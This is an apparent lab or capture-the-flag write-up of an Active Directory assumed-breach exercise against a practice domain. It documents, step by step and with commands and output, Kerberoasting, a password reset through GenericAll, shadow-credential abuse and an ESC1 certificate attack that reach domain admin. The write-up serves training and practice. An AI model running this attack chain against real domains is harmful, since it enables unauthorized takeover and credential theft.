## Description
```Description
### Objective and Scope

You are a member of the Hack Smarter Red Team. This penetration test will operate under an assumed breach scenario, starting with valid credentials for a standard domain user, `faraday`.

The primary goal is to simulate a realistic attack, identifying and exploiting vulnerabilities to escalate privileges from a standard user to a Domain Administrator.
```
### Starting Credentials
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._


```Creds
faraday:[password omitted]
```
----
##### IP 
```IP
10.1.171.108
```
----
##### Enumeration
- Rust-scan
```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-08-07 00:50:03Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hacksmarter.local, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.hacksmarter.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.hacksmarter.local
| Issuer: commonName=hacksmarter-DC01-CA/domainComponent=hacksmarter
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-21T15:35:32
| Not valid after:  2026-09-21T15:35:32
| MD5:     fae9 1340 b0a8 16fc 0420 5560 a2c9 6fed
| SHA-1:   affe d211 3720 65b4 1ee7 d8da 1a58 6825 5903 d150
| SHA-256: f90f 862f 3c3e 8a53 9e9c 35b8 cfa3 a75a 9121 4ad0 0e43 d847 2d6f 6faf 9817 a749
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hacksmarter.local, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.hacksmarter.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.hacksmarter.local
| Issuer: commonName=hacksmarter-DC01-CA/domainComponent=hacksmarter
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-21T15:35:32
| Not valid after:  2026-09-21T15:35:32
| MD5:     fae9 1340 b0a8 16fc 0420 5560 a2c9 6fed
| SHA-1:   affe d211 3720 65b4 1ee7 d8da 1a58 6825 5903 d150
| SHA-256: f90f 862f 3c3e 8a53 9e9c 35b8 cfa3 a75a 9121 4ad0 0e43 d847 2d6f 6faf 9817 a749
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hacksmarter.local, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.hacksmarter.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.hacksmarter.local
| Issuer: commonName=hacksmarter-DC01-CA/domainComponent=hacksmarter
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-21T15:35:32
| Not valid after:  2026-09-21T15:35:32
| MD5:     fae9 1340 b0a8 16fc 0420 5560 a2c9 6fed
| SHA-1:   affe d211 3720 65b4 1ee7 d8da 1a58 6825 5903 d150
| SHA-256: f90f 862f 3c3e 8a53 9e9c 35b8 cfa3 a75a 9121 4ad0 0e43 d847 2d6f 6faf 9817 a749
3269/tcp  open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hacksmarter.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.hacksmarter.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.hacksmarter.local
| Issuer: commonName=hacksmarter-DC01-CA/domainComponent=hacksmarter
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-21T15:35:32
| Not valid after:  2026-09-21T15:35:32
| MD5:     fae9 1340 b0a8 16fc 0420 5560 a2c9 6fed
| SHA-1:   affe d211 3720 65b4 1ee7 d8da 1a58 6825 5903 d150
| SHA-256: f90f 862f 3c3e 8a53 9e9c 35b8 cfa3 a75a 9121 4ad0 0e43 d847 2d6f 6faf 9817 a749
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: HACKSMARTER
|   NetBIOS_Domain_Name: HACKSMARTER
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: hacksmarter.local
|   DNS_Computer_Name: DC01.hacksmarter.local
|   DNS_Tree_Name: hacksmarter.local
|   Product_Version: 10.0.20348
|_  System_Time: 2026-08-07T00:51:11+00:00
|_ssl-date: 2026-08-07T00:51:50+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC01.hacksmarter.local
| Issuer: commonName=DC01.hacksmarter.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-08-06T00:44:12
| Not valid after:  2027-02-05T00:44:12
| MD5:     3964 9d8c 82e4 2467 9ff3 181a 108f 4c6e
| SHA-1:   4ec8 7c2f fb41 1620 f7b1 9a71 a5fa 3b65 d39a 60bf
| SHA-256: 07f3 93d6 b40a 32dd 57ba a8bc 138e 6933 0437 e288 4a71 cb7f 9f3b 7e2d 49e0 8db4
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49798/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
55190/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
55191/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
55203/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
55217/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
55231/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
```
----
##### SystemInfo
- RPC NTLM Info
```bash
| rdp-ntlm-info:
|   Target_Name: HACKSMARTER
|   NetBIOS_Domain_Name: HACKSMARTER
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: hacksmarter.local
|   DNS_Computer_Name: DC01.hacksmarter.local
|   DNS_Tree_Name: hacksmarter.local
|   Product_Version: 10.0.20348
|_  System_Time: 2026-08-07T00:51:11+00:00
```
-----
##### SMB
- Enumeration
```bash
$ smbmap -H 10.1.171.108 -u "$USER" -p "$PASS" -r SYSVOL
[+] IP: 10.1.171.108:445	Name: hacksmarter.local   	Status: Authenticated
	Disk                        Permissions	Comment
	----                        -----------	-------
	ADMIN$                  	NO ACCESS	Remote Admin
	C$                         	NO ACCESS	Default share
	IPC$                        READ ONLY	Remote IPC
	NETLOGON                    READ ONLY	Logon server share
	SYSVOL                      READ ONLY	Logon server share
	./SYSVOL
	dr--r--r--                0 Sat Sep 20 22:51:09 2025	.
	dr--r--r--                0 Sat Sep 20 22:51:09 2025	..
	dr--r--r--                0 Sat Sep 20 22:51:09 2025	hacksmarter.local
[*] Closed 1 connections
```
- Enumerate Users
```bash
nxc ldap $TARGET \
-u "USER" \
-p "$PASS" \
--users | awk '/LDAP/ && $5 !~ /^\[/ && $5 != "-Username-" {print $5}' > users.txt

$ cat users.txt
Administrator
Guest
krbtgt
Goro
alt.svc
Yorinobu
Hanako
Faraday
Smasher
Soulkiller.svc
Hellman
kei.svc
Silverhand.svc
Oda
the_emperor
```
---- 
##### Impacket 
- SPN
```bash
─$ impacket-GetUserSPNs hacksmarter.local/$USER:$PASS \
-dc-ip $TARGET \
-request
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName            Name     MemberOf  PasswordLastSet             LastLogon  Delegation
------------------------------  -------  --------  --------------------------  ---------  ----------
AI/blackwall.hacksmarter.local  alt.svc            2025-09-21 11:07:42.894050  <never>

[-] CCache file is not found. Skipping...
$krb5tgs$23$*alt.svc$HACKSMARTER.LOCAL$hacksmarter.local/alt.svc*$[hash omitted]


$ impacket-GetUserSPNs hacksmarter.local/$USER:$PASS \
-dc-ip $TARGET \
-request > kerberoast.txt
grep '^\$krb5tgs' kerberoast.txt > altsvc.hash

$ hashcat -m 13100 altsvc.hash /usr/share/wordlists/rockyou.txt
:[password omitted]
```
- Creds
```bash
$ nxc smb $TARGET \
-u alt.svc \
-p '[password omitted]'
SMB         10.1.171.108    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hacksmarter.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.171.108    445    DC01             [+] hacksmarter.local\alt.svc:[password omitted]
```
- SMB Login Successful
- Bloodhound
```bash
alt.svc --Generic_All -> YORINOBU@HACKSMARTER.LOCAL
```
- Using `targetedkerberoast`
```bash
targetedKerberoast.py -v -d 'hacksmarter.local' -u 'alt.svc' -p '[password omitted]'
{*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (Yorinobu)


- Hachcat Unable to decrypt the hash
```
- Used BloodAD
```bash
 bloodyad \
  --host $TARGET \
  -d hacksmarter.local \
  -u alt.svc \
  -p '[password omitted]' \
  set password Yorinobu 'Y0rinobu@2026!'
[+] Password changed successfully!
```
- Winrm
```bash
 nxc winrm $TARGET \
-u Yorinobu \
-p 'Y0rinobu@2026!'
WINRM       10.1.171.108    5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hacksmarter.local)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.1.171.108    5985   DC01             [+] hacksmarter.local\Yorinobu:Y0rinobu@2026! (Pwn3d!)
```
- BloodyAD - Enumerate more about Machine
```bash
$ bloodyad \
  --host $TARGET \
  -d hacksmarter.local \
  -u Yorinobu \
  -p 'Y0rinobu@2026!' \
  get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=hacksmarter,DC=local
permission: WRITE

distinguishedName: CN=Yorinobu,CN=Users,DC=hacksmarter,DC=local
permission: WRITE

distinguishedName: CN=Soulkiller.svc,CN=Users,DC=hacksmarter,DC=local
permission: WRITE

distinguishedName: DC=hacksmarter.local,CN=MicrosoftDNS,DC=DomainDnsZones,DC=hacksmarter,DC=local
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.hacksmarter.local,CN=MicrosoftDNS,DC=ForestDnsZones,DC=hacksmarter,DC=local
permission: CREATE_CHILD


 $ bloodyad \
  --host $TARGET \
  -d hacksmarter.local \
  -u Yorinobu \
  -p 'Y0rinobu@2026!' \
  add shadowCredentials Soulkiller.svc
[+] KeyCredential generated with following sha256 of RSA key: e08c61427321ae2a01067de4890d6376d118f4e7d549eb78c54a4986404ee8ea
[+] TGT stored in ccache file Soulkiller.svc_5q.ccache

NT: [nthash omitted]
```
- SMB Confirmation
```bash
$ nxc smb $TARGET \
-u Soulkiller.svc \
-H [nthash omitted]
SMB         10.1.171.108    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hacksmarter.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.171.108    445    DC01             [+] hacksmarter.local\Soulkiller.svc:[nthash omitted]
```
- export hash & cache with krb5.onf
```bash
export KRB5CCNAME=/home/kali/HackSmarter/Arasaka/Soulkiller.svc_1e.ccache export KRB5_CONFIG=/home/kali/HackSmarter/Arasaka/krb5.conf
```
- Enumerate More - Certipy
```bash
certipy-ad find \
  -k \
  -target DC01.hacksmarter.local \
  -dc-ip $TARGET \
  -enabled \
  -vulnerable \
  -stdout


Template Name: AI_Takeover

Enrollment Rights:
    HACKSMARTER.LOCAL\Soulkiller.svc

Enrollee Supplies Subject: True

Extended Key Usage:
    Client Authentication

Vulnerabilities:
    ESC1
```
- Found Vulnerability - `#ESC1`
```bash
$ certipy-ad req \
  -k \
  -target DC01.hacksmarter.local \
  -dc-ip $TARGET \
  -ca hacksmarter-DC01-CA \
  -template AI_Takeover \
  -upn the_emperor@hacksmarter.local \
  -sid S-1-5-21-3154413470-3340737026-2748725799-1601
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Request ID is 7
[*] Successfully requested certificate
[*] Got certificate with UPN 'the_emperor@hacksmarter.local'
[*] Certificate object SID is 'S-1-5-21-3154413470-3340737026-2748725799-1601'
[*] Saving certificate and private key to 'the_emperor.pfx'
[*] Wrote certificate and private key to 'the_emperor.pfx'

└─$ certipy-ad auth \
  -pfx the_emperor.pfx \
  -dc-ip $TARGET
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'the_emperor@hacksmarter.local'
[*]     SAN URL SID: 'S-1-5-21-3154413470-3340737026-2748725799-1601'
[*]     Security Extension SID: 'S-1-5-21-3154413470-3340737026-2748725799-1601'
[*] Using principal: 'the_emperor@hacksmarter.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'the_emperor.ccache'
[*] Wrote credential cache to 'the_emperor.ccache'
[*] Trying to retrieve NT hash for 'the_emperor'
[*] Got hash for 'the_emperor@hacksmarter.local': aad3b435b51404eeaad3b435b51404ee:[nthash omitted]
```
- here is two domain Admins - Administrator isn't the path for this and Got the admin - `the_emperor`
```bash
nxc smb $TARGET \
-u the_emperor \
-H [nthash omitted]
SMB         10.1.171.108    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hacksmarter.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.171.108    445    DC01             [+] hacksmarter.local\the_emperor:[nthash omitted] (Pwn3d!)


evil-winrm -i 10.1.171.108 -u the_emperor -H '[nthash omitted]'
*Evil-WinRM* PS C:\Users\ADministrator> cd Desktop
dir
*Evil-WinRM* PS C:\Users\ADministrator\Desktop> dir


    Directory: C:\Users\ADministrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         6/21/2016   3:36 PM            527 EC2 Feedback.website
-a----         6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website
-a----         9/21/2025   3:31 PM             32 root.txt


*Evil-WinRM* PS C:\Users\ADministrator\Desktop> type root.txt
[flag omitted]
```

# END